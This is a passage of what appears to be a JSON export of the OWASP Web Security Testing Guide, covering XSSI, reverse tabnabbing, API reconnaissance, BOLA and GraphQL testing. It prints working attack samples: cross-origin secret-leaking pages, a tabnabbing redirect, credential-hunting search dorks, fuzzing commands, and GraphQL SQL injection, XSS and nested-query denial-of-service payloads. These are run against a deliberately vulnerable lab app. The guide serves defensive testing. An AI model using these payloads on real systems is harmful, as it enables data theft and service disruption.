        "summary": "<h3>Summary</h3><p>Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user’s personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (e.g. transfer money to the attacker’s account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.</p><p>By default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by RFC 6454 ). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML <script> tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.</p><p>When the browser opens a website with <script> tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn’t have to be a JavaScript file with type text/javascript or .js extension.</p><p>Older browser’s vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the <script> tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see Identifier based XSSI attacks .</p><h3>Test Objectives</h3><ul><li>Locate sensitive data across the system.</li><li>Assess the leakage of sensitive data through various techniques.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using JSONP . To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they’re different, it means the response is dynamic; otherwise it’s static. To simplify this task, a tool such as Veit Hailperin’s Burp proxy plugin can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.</p><p>Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:</p><p>An API key is stored in a JavaScript file with the URI https://victim.com/internal/api.js on the victim’s website, victim.com , which is only accessible to authenticated users. An attacker configures a website, attackingwebsite.com , and uses the <script> tag to refer to the JavaScript file.</p><p>Here are the contents of https://victim.com/internal/api.js :</p><pre><code>( function () { window . secret = \" supersecretUserAPIkey \" ; })();</code></pre><p>The attack site, attackingwebsite.com , has an index.html with the following code:</p><pre><code><!DOCTYPE html> <html> <head> <title> Leaking data via global variables </title> </head> <body> <h1> Leaking data via global variables </h1> <script src= \"https://victim.com/internal/api.js\" ></script> <div id= \"result\" > </div> <script> var div = document . getElementById ( \" result \" ); div . innerHTML = \" Your secret data <b> \" + window . secret + \" </b> \" ; </script> </body> </html></code></pre><p>In this example, a victim is authenticated with victim.com . An attacker lures the victim to attackingwebsite.com via social engineering, phishing emails, etc. The victim’s browser then fetches api.js , resulting in the sensitive data being leaked via the global JavaScript variable and displayed using innerHTML .</p><p>This example is similar to the previous one, except in this case attackingwebsite.com uses a global JavaScript function to extract the sensitive data by overwriting the victim’s global JavaScript function.</p><p>Here are the contents of https://victim.com/internal/api.js :</p><pre><code>( function () { var secret = \" supersecretAPIkey \" ; window . globalFunction ( secret ); })();</code></pre><p>The attack site, attackingwebsite.com , has an index.html with the following code:</p><pre><code><!DOCTYPE html> <html> <head> <title> Leaking data via global function parameters </title> </head> <body> <div id= \"result\" > </div> <script> function globalFunction ( param ) { var div = document . getElementById ( \" result \" ); div . innerHTML = \" Your secret data: <b> \" + param + \" </b> \" ; } </script> <script src= \"https://victim.com/internal/api.js\" ></script> </body> </html></code></pre><p>There are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see The Unexpected Dangers of Dynamic JavaScript .</p><p>To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada’s Identifier based XSSI attacks whitepaper.</p><pre><code>HTTP/1.1 200 OK\nContent-Type: text/csv\nContent-Disposition: attachment; filename=\"a.csv\"\nContent-Length: xxxx\n\n1,\"___\",\" [email protected] \",\"03-0000-0001\"\n2,\"foo\",\" [email protected] \",\"03-0000-0002\"\n...\n98,\"bar\",\" [email protected] \",\"03-0000-0088\"\n99,\"___\",\" [email protected] \",\"03-0000-0099\"</code></pre><p>In this example, using the ___ columns as injection points and inserting JavaScript strings in their place has the following result.</p><pre><code>1,\"\\\"\",$$$=function(){/*\",\" [email protected] \",\"03-0000-0001\"\n2,\"foo\",\" [email protected] \",\"03-0000-0002\"\n...\n98,\"bar\",\" [email protected] \",\"03-0000-0088\"\n99,\"*/}//\",\" [email protected] \",\"03-0000-0099\"</code></pre><p>Jeremiah Grossman wrote about a similar vulnerability in Gmail in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:</p><pre><code><!DOCTYPE html> <html> <head> <title> Leaking gmail contacts via JSON </title> </head> <body> <script> function Array () { // steal data } </script> <script src= \"https://mail.google.com/mail/?_url_scrubbed_\" ></script> </body> </html></code></pre><p>Browsers normally present standardized JavaScript error messages . However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website victim.com serves the following content at the URI https://victim.com/service/csvendpoint for authenticated users:</p><pre><code>HTTP/1.1 200 OK\nContent-Type: text/csv\nContent-Disposition: attachment; filename=\"a.csv\"\nContent-Length: 13\n\n1,abc,def,ghi</code></pre><p>This vulnerability could be exploited with the following:</p><pre><code><!--error handler --> <script> window . onerror = function ( err ) { alert ( err )} </script> <!--load target CSV --> <script src= \"https://victim.com/service/csvendpoint\" ></script></code></pre><p>When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:</p><p>Figure 4.11.13-1: JavaScript runtime error message</p><br><p>In JavaScript, the this keyword is dynamically scoped. This means if a function is called upon an object, this will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from Sebastian Leike’s demonstration page , the sensitive data is stored in an Array. An attacker can override Array.prototype.forEach with an attacker-controlled function. If some code calls the forEach function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with this pointing to the object that contains the sensitive data.</p><p>Here is an excerpt of a JavaScript file containing sensitive data, javascript.js :</p><pre><code>... ( function () { var secret = [ \" 578a8c7c0d8f34f5 \" , \" 345a8b7c9d8e34f5 \" ]; secret . forEach ( function ( element ) { // do something here }); })(); ...</code></pre><p>The sensitive data can be leaked with the following JavaScript code:</p><pre><code>... <div id= \"result\" > </div> <script> Array . prototype . forEach = function ( callback ) { var resultString = \" Your secret values are: <b> \" ; for ( var i = 0 , length = this . length ; i < length ; i ++ ) { if ( i > 0 ) { resultString += \" , \" ; } resultString += this [ i ]; } resultString += \" </b> \" ; var div = document . getElementById ( \" result \" ); div . innerHTML = resultString ; }; </script> <script src= \"https://victim.com/..../javascript.js\" ></script> ...</code></pre>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-14": {
        "summary": "<h3>Summary</h3><p>Reverse Tabnabbing is an attack which can be used to redirect users to phishing pages. This usually becomes possible due to the target attribute of the <a> tag being set to _blank which causes the link to be opened in a new tab. When the attribute rel='noopener noreferrer' is not used in the same <a> tag, the newly opened page can influence the original page and redirect it to a domain controlled by the attacker.</p><p>Since the user was on the original domain when the new tab opened, they are less likely to notice that the page has changed, especially if the phishing page is identical to the original domain. Any credentials entered on the attacker-controlled domain will thus end up in the attacker’s possession.</p><p>Links opened via the window.open JavaScript function are also vulnerable to this attack.</p><p>NOTE: This is a legacy issue that does not affect modern browsers . Older versions of popular browsers (For example, versions prior to Google Chrome 88) as well as Internet Explorer are vulnerable to this attack.</p><p>Imagine a web application where users are allowed to insert a URL in their profile. If the application is vulnerable to reverse tabnabbing, a malicious user will be able to provide a link to a page that has the following code:</p><pre><code><html> <body> <script> window . opener . location = \" https://example.org \" ; </script> <b> Error loading... </b> </body> </html></code></pre><p>Clicking on the link will open up a new tab while the original tab will redirect to “example.org”. Suppose “example.org” looks similar to the vulnerable web application, the user is less likely to notice the change and is more likely to enter sensitive information on the page.</p>",
        "how-to": "<h3>How to Test</h3><ul><li>Check the HTML source of the application to see if links withtarget=\"_blank\"are using thenoopenerandnoreferrerkeywords in therelattribute. If not, it is likely that the application is vulnerable to reverse tabnabbing. Such a link becomes exploitable if it either points to a third-party site that has been compromised by the attacker, or if it is user-controlled.</li><li>Check for areas where an attacker can insert links, i.e. control thehrefargument of an<a>tag. Try to insert a link to a page which has the source code given in the above example, and see if the original domain redirects. This test can be done in IE if other browsers don’t work.</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>It is recommended to make sure that the rel HTML attribute is set with the noreferrer and noopener keywords for all links.</p><h3>References</h3><ul><li>Tabnabbing - HTML5 Cheat Sheet</li><li>The target=”_blank” vulnerability by example</li><li>About rel=noopener</li><li>Target=”_blank” — the most underestimated vulnerability ever</li><li>Reverse tabnabbing vulnerability affects IBM Business Automation Workflow and IBM Business Process Manager</li></ul>",
        "test_objectives": ""
    },
    "WSTG-APIT-01": {
        "summary": "<h3>Summary</h3><p>Reconnaissance is an important step in any pentesting engagement. This includes API pentesting. Reconnaissance significantly enhances the effectiveness of the testing process by gathering information about the API and developing an understanding of the target. This phase not only increases the likelihood of discovering critical security issues but also ensures a comprehensive evaluation of the APIs’ security posture.</p><p>This guide has a section on Information Gathering which can apply when auditing APIs. However, there are some differences. As security researchers, we often focus on specific areas and searching this guide for the sections that apply can be time consuming. To ensure the researcher has a single location to focus on APIs this section concentrates on those items that apply to APIs and provides references to supporting content elsewhere in the guide.</p><p>APIs can be public or private.</p><p>Public APIs typically have their details published in a Swagger/OpenAPI document. Gaining access to this document is important to understand the attack surface. Equally important is finding older versions of this document that might show depricated but still functional code that may have security vulnerabilities.</p><p>Keep in mind that this document, however well intentioned, may not be accurate, and also may not dislose the complete API.</p><p>Public APIs may also be documented on shared libraries or directories of APIs.</p><p>The visibility of private APIs depends on who the intended consumer is. An API can be private, but only accessible to subscribed clients (also known as partners ) or only accessible to internal clients, such as other departments within the same company. Finding private APIs using reconnaissance techniques is also important. These APIs can be discovered using a number of techniques which we will discuss below.</p><h3>Test Objectives</h3><ul><li>Find all API endpoints supported by the backend server code, documented or undocumented.</li><li>Find all parameters for each endpoint supported by the backend server, documented or undocumented.</li><li>Discover interesting data related to APIs in HTML and JavaScript sent to clients.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In both public and private cases, the API documentation will be useful based on its level of the quality and accurracy. Public API documentaton is typically shared with everyone whereas private API documentation is only shared with the intended client. However, in both cases finding documentation, accidentally leaked or otherwise will be helpfull in your investigation.</p><p>Regardless of the visibility of the API, searching for API documentation can find older, not-yet-published, or accidentally leaked API documentation. This documentation will be very helpfull in understanding what the attack surface the API exposes.</p><p>Alternatives sources of API documentation can incluide API Directories, such as:</p><ul><li>GitHub in general</li><li>GitHub Public APIs Repository</li><li>APIs.guru</li><li>RapidAPI</li><li>PublicAPIsandPublicAPIs</li><li>Postman API Network</li></ul><p>If documentation is not readily apparent, then you can actively search the target for documentation based on a few obvious names or paths. These include:</p><ul><li>/api-docs</li><li>/doc</li><li>/swagger</li><li>/swagger.json</li><li>/openapi.json</li><li>/.well-known/schema-discovery</li></ul><p>robots.txt is a text file that site owners create to instruct web crawlers (such as search engine bots) on how to crawl and index their site. It is part of the Robots Exclusion Protocol (REP), which regulates how bots interact with sites.</p><p>This file may provide additional clues to path structure or API endpoints.</p><p>The Information Gathering section refers to robots.txt in several cases including WSTG-INFO-01, WSTG-INFO-03, WSTG-INFO-05, and WSTG-INFO-08.</p><p>If the application uses GitHub, GitLab, or other public facing Git based repositories then we can also search for any clues or sensitive content (also known as GitDorking ). This information can include passwords, API keys, configuration files, and other confidential data that developers may accidentally or inadvertently commit to their repositories. Organizations can accidentally share sensitive code, sample, or test code that may provide clues to implementation details. The personal GitHub accounts of the target’s employees may also accidentally release information that can provide clues.</p><p>Even if you have the API documentation browsing the application is a good idea. Documentation can be outdated, inaccurate, or incomplete.</p><p>Browsing the application with an intercepting proxy such as ZAP or Burp Suite records endpoints for later inspection. In addition, using their built-in spidering functionality, intercepting proxies can help generate a comprehensive list of endpoints. From the spidered URLs look for links with obvious API URL naming schemes. These include:</p><ul><li>https://example.com/api/v1(or v2 etc)</li><li>https://example.com/graphql</li></ul><p>Or subdomains the the applications may consume or depend upon:</p><ul><li>https://api.example.com/api/v1</li></ul><p>It is important that the pentester attempts to exercise as much functionality in the application as possible. This is not only to generate a comprehensive list of endpoints but also to avoid issues with lazy loading and code splitting. In addition, your pentest engagement should include sample accounts at different privilege levels so that your browser and spidering can access and expose endpoints for as much functionality as possible.</p><p>Once completed, the endpoint information obtained from browsing and spidering of the application can help the pentester compose API documentation of the target using other tools such as Postman.</p><p>Using passive reconnaissance techniques such as Google Dorking with directives such as site and inurl allows us to tailor a search for common API keywords that the Google indexer may have found. Review Conduct Search Engine Discovery Reconnaissance for Information Leakage for additional information.</p><p>Here are a few API specific examples:</p><p>site:\"mytargetsite.com\" inurl:\"/api\"</p><p>inurl:apikey filetype:env</p><p>Other keywords can include \"v1\" , \"api\" , \"graphql\" .</p><p>We can extend the Google Dorking to include subdomains of the target.</p><p>Wordlists are helpful here for a comprehensive list of common words used in APIs.</p><p>In general APIs change over time. But deprecated or older version may still be operational either on purpose or by misconfiguration. These should also be tested as there is a good chance that they will contain vulnerabilities that newer versions have fixed. In addition, changes to APIs show newer features which may be less robust and therefore a good candidate for testing.</p><p>To discover older versions we can use the Wayback machine to help find older endpoints. A helpful tool know as TomNomNom’s WayBackUrls fetches all the URLs that the Wayback Machine knows about for a domain.</p><ul><li>WayBackUrls. Fetch all the URLs that the Wayback Machine knows about for a domain.</li><li>waymore. Find way more from the Wayback Machine, Common Crawl, Alien Vault OTX, URLScan & VirusTotal.</li><li>gau. Fetch known URLs from AlienVault’s Open Threat Exchange, the Wayback Machine, and Common Crawl.</li></ul><p>An excellent source of API and other information is the HTML and JavaScript that the server sends to the client. Sometimes, the client application leaks sensitive information including APIs and secrets. The Review Web Page Content for Information Leakage section has some general information for reviewing web content for leakage. Here we will expand to focus on reviewing the JavaScript content for API related secrets.</p><p>There are a variety of tools that we can use to help us extract sensitive information from JavaScript transmitted to the browser. These tools are typically based on one of two approaches: Regular Expressions or Abstract Syntax Trees (AST). Then there are generalized tools that help us organize or manage JS files for investigation by AST and Regular Expression tools.</p><p>Regex is more straightforward by searching JS or HTML content for known patterns. However, this approach can miss content not explicitly identified in the Regular Expression. Given the structure of some JS this approach can miss a lot. ASTs on the other hand are tree-like structures that represent the syntax of source code. Each node in the tree corresponds to a part of the code. For JavaScript, an AST breaks the code into basic components, allowing tools and compilers to understand and modify the code easily.</p><p>Active Fuzzing involves using tools with wordlists and filtering requests results to bruteforce endpoint discovery.</p><p>KiteRunner is a tool that performs traditional content discovery and bruteforcing routes/endpoints in modern applications and APIs.</p><pre><code>kr [scan|brute] <input> [ flags]</code></pre><p>To scan a target for APIs using a wordlist we can:</p><pre><code>kr scan https://example.com/api -w /usr/share/wordlists/apis/routes-large.kite --fail-status-codes 404,403</code></pre><p>All three of FFUF, DirBuster, and GoBuster are designed to discover hidden paths and files on web servers through brute-forcing techniques. All three use customizable wordlists to generate requests to the target web server, attempting to identify valid directories and files. All three support multi-threaded or highly efficient processing to speed up the brute-forcing process.</p><p>Some common wordlist files for APIs include: SecLists in the Discovery/Web-Content/api section, GraphQL Wordlist , and Assetnote .</p><p>GoBuster Example:</p><p>gobuster dir -u <target url> -w <wordlist file></p><h3>References</h3><ul><li>REST Assessment Cheat Sheet</li></ul><ul><li>Corey J. Ball - “Hacking APIs : breaking web application programming interfaces”, No Starch, 2022 - ISBN-13: 978-1-7185-0244-4</li><li>Confidence Staveley - “API Security for White Hat Hackers, Packt, 2024 - ISBN 978-1-80056-080-2</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-APIT-02": {
        "summary": "<h3>Summary</h3><p>Broken Object Level Authorization (BOLA) occurs when an API does not properly enforce authorization checks for each object accessed by the client. Attackers can manipulate object identifiers in API requests (such as IDs, GUIDs, or tokens) to access or modify resources they are not authorized to. This vulnerability is critical in APIs due to their direct access to underlying objects and the prevalence of APIs in modern applications.</p><p>Exploiting BOLA can lead to unauthorized access to sensitive data, user impersonation, horizontal privilege escalation (accessing other users’ resources), and vertical privilege escalation (gaining unauthorized admin-level access).</p><h3>Test Objectives</h3><ul><li>The objective of this test is to identify whether the API enforces properobject-level authorizationchecks, ensuring that users can only access and manipulate objects they are authorized to interact with.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Review API documentation (e.g. OpenAPI specification), traffic, or use an interception proxy (e.g., Burp Suite , ZAP ) to identify endpoints that accept object identifiers of interest. These could be in the form of IDs , UUIDs , or other references.</p><p>Examples:</p><ul><li>GET /api/users/{user_id}</li><li>GET /api/orders/{order_id}</li><li>POST /graphqlquery: {user(id: \"123\") }</li></ul><br><p>With the knowledge gained in the previous step, review and collect third-party object identifiers (e.g. user IDs, orders IDs etc) that can be used subsequently in the object identifiers manipulation.</p><p>Additionaly, generate a list of potential object identifiers for brute-force. For example, if an API is retrieving a purchase order from an authenticated user, generate various purchase order IDs for testing.</p><p>With the goal to determine if users can access or modify objects they do not own by altering object identifiers in API request, change the object identifier (e.g., user ID, order ID) in the URL or request body.</p><p>Example: Modify a request like GET /api/users/123/profile (where 123 is the current user ID) to GET /api/users/124/profile (where 124 is another user’s ID).</p><p>Depending on the application context, utilize two different accounts to perform the tests. With an account A, create resources that exclusively belongs to that account (e.g. purchase order) and with an account B, try to access the resource from account A (e.g. purchase order).</p><p>Test various HTTP methods for BOLA vulnerabilities:</p><ul><li>GET: Try accessing unauthorized objects by manipulating the object ID in the request.</li><li>POST/PUT/PATCH: Attempt to create or modify objects that belong to other users.</li><li>DELETE: Try to delete an object owned by another user.</li></ul><p>For GraphQL APIs , send a query with a modified object ID in the query parameters (see Testing GraphQL ):</p><p>Example: query { user(id: \"124\") { name, email } } .</p><p>Test if the API allows unauthorized bulk access to objects. This could happen in endpoints that return lists of objects.</p><p>Example: GET /api/users returns data for all users instead of only the authenticated user’s data.</p><h3>Indicators of BOLA</h3><ul><li>Successful exploitation: If modifying an object ID in the request returns data or allows actions on objects that belong to other users, the API is vulnerable to BOLA.</li><li>Error responses: Properly secured APIs in general would return403 Forbiddenor401 Unauthorizedfor unauthorized object access. A200 OKresponse for another user’s object indicates BOLA.</li><li>Inconsistent responses: If some endpoints enforce authorization and others do not, it points to incomplete or inconsistent security controls.</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>ZAP: Automated scanners or manual proxy tools can help test object references in API requests.</li><li>Burp Suite: Use theRepeaterorIntrudertools to manipulate object IDs and send multiple requests to test access control.</li><li>Postman: Send requests with altered object IDs and observe the responses.</li><li>Fuzzing Tools: Use fuzzers to brute-force object IDs and check for unauthorized access.</li></ul><h3>References</h3><ul><li>OWASP API Security Top 10: BOLA</li><li>OWASP Testing Guide: Testing for Insecure Direct Object References (IDOR)</li><li>OWASP Testing Guide: Testing for GraphQL</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>Object Ownership Checks: Ensure that object-level authorization checks are performed for every API request. Always verify that the user making the request is authorized to access the requested object.</li><li>Role-Based Access Control (RBAC): Implement RBAC policies that define which roles can access or modify specific objects.</li><li>Least Privilege Principle: Apply the principle of least privilege to ensure that users can only access the minimum set of objects they need for their role.</li><li>Use UUIDs or Non-Sequential IDs: Prefer non-predictable, non-sequential object identifiers (e.g.,UUIDsinstead of simple integers) to make enumeration and brute-force attacks harder.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-APIT-99": {
        "summary": "<h3>Summary</h3><p>GraphQL has become very popular in modern APIs. It provides simplicity and nested objects, which facilitate faster development. While every technology has advantages, it can also expose the application to new attack surfaces. The purpose of this scenario is to provide some common misconfigurations and attack vectors on applications that utilize GraphQL. Some vectors are unique to GraphQL (e.g. Introspection Query ) and some are generic to APIs (e.g. SQL injection ).</p><p>Examples in this section will be based on a vulnerable GraphQL application poc-graphql , which is run in a docker container that maps localhost:8080/GraphQL as the vulnerable GraphQL node.</p><h3>Test Objectives</h3><ul><li>Assess that a secure and production-ready configuration is deployed.</li><li>Validate all input fields against generic attacks.</li><li>Ensure that proper access controls are applied.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Testing GraphQL nodes is not very different than testing other API technologies. Consider the following steps:</p><p>Introspection queries are the method by which GraphQL lets you ask what queries are supported, which data types are available, and many more details you will need when approaching a test of a GraphQL deployment.</p><p>The GraphQL website describes Introspection :</p><p>“It’s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!”</p><p>There are a couple of ways to extract this information and visualize the output, as follows.</p><p>The most straightforward way is to send an HTTP request (using a personal proxy) with the following payload, taken from an article on Medium :</p><pre><code>query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ... FullType } directives { name description locations args { ... InputValue } } } } fragment FullType on __Type { kind name description fields ( includeDeprecated : true ) { name description args { ... InputValue } type { ... TypeRef } isDeprecated deprecationReason } inputFields { ... InputValue } interfaces { ... TypeRef } enumValues ( includeDeprecated : true ) { name description isDeprecated deprecationReason } possibleTypes { ... TypeRef } } fragment InputValue on __InputValue { name description type { ... TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }</code></pre><p>The result will usually be very long (and hence has been shortened here), and it will contain the entire schema of the GraphQL deployment.</p><p>Response:</p><pre><code>{ \"data\" : { \"__schema\" : { \"queryType\" : { \"name\" : \"Query\" }, \"mutationType\" : { \"name\" : \"Mutation\" }, \"subscriptionType\" : { \"name\" : \"Subscription\" }, \"types\" : [ { \"kind\" : \"ENUM\" , \"name\" : \"__TypeKind\" , \"description\" : \"An enum describing what kind of type a given __Type is\" , \"fields\" : null , \"inputFields\" : null , \"interfaces\" : null , \"enumValues\" : [ { \"name\" : \"SCALAR\" , \"description\" : \"Indicates this type is a scalar.\" , \"isDeprecated\" : false , \"deprecationReason\" : null }, { \"name\" : \"OBJECT\" , \"description\" : \"Indicates this type is an object. `fields` and `interfaces` are valid fields.\" , \"isDeprecated\" : false , \"deprecationReason\" : null }, { \"name\" : \"INTERFACE\" , \"description\" : \"Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.\" , \"isDeprecated\" : false , \"deprecationReason\" : null }, { \"name\" : \"UNION\" , \"description\" : \"Indicates this type is a union. `possibleTypes` is a valid field.\" , \"isDeprecated\" : false , \"deprecationReason\" : null }, ], \"possibleTypes\" : null } ] } } }</code></pre><p>A tool such as GraphQL Voyager can be used to get a better understanding of the GraphQL endpoint:</p><p>Figure 12.1-1: GraphQL Voyager</p><br><p>This tool creates an Entity Relationship Diagram (ERD) representation of the GraphQL schema, allowing you to get a better look into the moving parts of the system you’re testing. Extracting information from the drawing allows you to see you can query the Dog table for example. It also shows which properties a Dog has:</p><ul><li>ID</li><li>name</li><li>veterinary (ID)</li></ul><p>There is one downside to using this method: GraphQL Voyager does not display everything that can be done with GraphQL. For example, the mutations available are not listed in the drawing above. A better strategy would be to use both Voyager and one of the methods listed below.</p><p>GraphiQL is a web-based IDE for GraphQL. It is part of the GraphQL project, and it is mainly used for debugging or development purposes. The best practice is to not allow users to access it on production deployments. If you are testing a staging environment, you might have access to it and can thus save some time when working with introspection queries (although you can, of course, use introspection in the GraphiQL interface).</p><p>GraphiQL has a documentation section, which uses the data from the schema in order to create a document of the GraphQL instance that is being used. This document contains the data types, mutations, and basically every piece of information that can be extracted using introspection.</p><p>GraphQL Playground is a GraphQL client. It can be used to test different queries, as well as divide GraphQL IDEs into different playgrounds, and group them by theme or by assigning a name to them. Much like GraphiQL, Playground can create documentation for you without the need for manually sending introspection queries and processing the response(s). It has another great advantage: It doesn’t need the GraphiQL interface to be available. You can direct the tool to the GraphQL node via a URL, or use it locally with a data file. GraphQL Playground can be used to test for vulnerabilities directly, so you don’t need to use a personal proxy to send HTTP requests. This means you can use this tool for simple interaction with and assessment of GraphQL. For other more advanced payloads, use a personal proxy.</p><p>Note that in some cases, you will need to set the HTTP headers at the bottom, to include session ID or other mechanism of authentication. This still allows creating multiple “IDEs” with different permissions to verify if there are in fact authorization issues.</p><p>Figure 12.1-2: GraphQL Playground High Level API Docs</p><br><p>Figure 12.1-3: GraphQL Playground API Schema</p><br><p>You can even download the schemas to use in Voyager.</p><p>Introspection is a useful tool that allows users to gain more information about the GraphQL deployment. However, this will also allow malicious users to gain access to the same information. The best practice is to limit access to the introspection queries, since some tools or requests might fail if this feature is disabled altogether. As GraphQL usually bridges to the backend APIs of the system, it’s better to enforce strict access control.</p><p>Introspection is the first place to look for authorization problems. As noted, access to introspection should be restricted as it allows for data extraction and data gathering. Once a tester has access to the schema and knowledge of the sensitive information there is to extract, they should then send queries that will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform authorization enforcement.</p><p>In the earlier examples, the output of the introspection query shows there is a query called auth . This seems like a good place to extract sensitive information such as API tokens, passwords, etc.</p><p>Figure 12.1-4: GraphQL Auth Query API</p><br><p>Testing the authorization implementation varies from deployment to deployment since each schema will have different sensitive information, and hence, different targets to focus on.</p><p>In this vulnerable example, every user (even unauthenticated) can gain access to the auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the schema allows, such as associating or disassociating a dog from any specified veterinarian using mutations, even if there is no matching auth token for the veterinarian in the request.</p><p>Here is an example in which the tester uses an extracted token they do not own to perform an action as the veterinarian “Benoit”:</p><pre><code>query brokenAccessControl { myInfo ( accessToken : \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew\" , veterinaryId : 2 ){ id , name , dogs { name } } }</code></pre><p>And the response:</p><pre><code>{ \"data\" : { \"myInfo\" : { \"id\" : 2 , \"name\" : \"Benoit\" , \"dogs\" : [ { \"name\" : \"Babou\" }, { \"name\" : \"Baboune\" }, { \"name\" : \"Babylon\" }, { \"name\" : \"...\" } ] } } }</code></pre><p>All of the Dogs in the list belong to Benoit, and not to the auth token owner. It’s possible to perform this type of action when proper authorization enforcement is not implemented.</p><p>GraphQL is the implementation of the API layer of an application, and as such, it usually forwards the requests to a backend API or the database directly. This allows you to utilize any underlying vulnerability such as SQL injection, command injection, cross-site scripting, etc. Using GraphQL just changes the entry point of the malicious payload.</p><p>You can refer to other scenarios within the OWASP testing guide to get some ideas.</p><p>GraphQL also has scalars, which are usually used for custom data types that do not have native data types, such as DateTime. These types of data do not have out-of-the-box validation, making them good candidates for testing.</p><p>The example application is vulnerable by design in the query dogs(namePrefix: String, limit: Int = 500): [Dog!] since the parameter namePrefix is concatenated in the SQL query. Concatenating user input is a common malpractice of applications that can expose them to SQL injection.</p><p>The following query extracts information from the CONFIG table within the database:</p><pre><code>query sqli { dogs ( namePrefix : \"ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- \" , limit : 1000 ) { id name } }</code></pre><p>The response to this query is:</p><pre><code>{ \"data\" : { \"dogs\" : [ { \"id\" : 1 , \"name\" : \"Abi\" }, { \"id\" : 2 , \"name\" : \"Abime\" }, { \"id\" : 3 , \"name\" : \"...\" }, { \"id\" : 50 , \"name\" : \"$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^\" } ] } }</code></pre><p>The query contains the secret that signs JWTs in the example application, which is very sensitive information.</p><p>In order to know what to look for in any particular application, it will be helpful to collect information about how the application is built and how the database tables are organized. You can also use tools like sqlmap to look for injection paths and even automate the extraction of data from the database.</p><p>Cross-site scripting occurs when an attacker injects executable code that is subsequently run by the browser. Learn about tests for XSS in the Input Validation chapter. You may test for reflected XSS using a payload from Testing for Reflected Cross Site Scripting .</p><p>In this example, errors might reflect the input and could cause XSS to occur.</p><p>Payload:</p><pre><code>query xss { myInfo ( veterinaryId : \"<script>alert('1')</script>\" , accessToken : \"<script>alert('1')</script>\" ) { id name } }</code></pre><p>Response:</p><pre><code>{ \"data\" : null , \"errors\" : [ { \"message\" : \"Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'\" , \"locations\" : [ { \"line\" : 2 , \"column\" : 10 , \"sourceName\" : null } ], \"description\" : \"argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'\" , \"validationErrorType\" : \"WrongType\" , \"queryPath\" : [ \"myInfo\" ], \"errorType\" : \"ValidationError\" , \"extensions\" : null , \"path\" : null } ] }</code></pre><p>GraphQL exposes a very simple interface to allow developers to use nested queries and nested objects. This ability can also be used in a malicious way, by calling a deep nested query similar to a recursive function and causing a denial of service by using up CPU, memory, or other compute resources.</p><p>Looking back at Figure 12.1-1 , you can see that it is possible to create a loop where a Dog object contains a Veterinary object. There could be an endless amount of nested objects.</p><p>This allows for a deep query which has the potential to overload the application:</p><pre><code>query dos { allDogs ( onlyFree : false , limit : 1000000 ) { id name veterinary { id name dogs { id name veterinary { id name dogs { id name veterinary { id name dogs { id name veterinary { id name dogs { id name veterinary { id name dogs { id name } } } } } } } } } } } }</code></pre><p>There are multiple security measures that can be 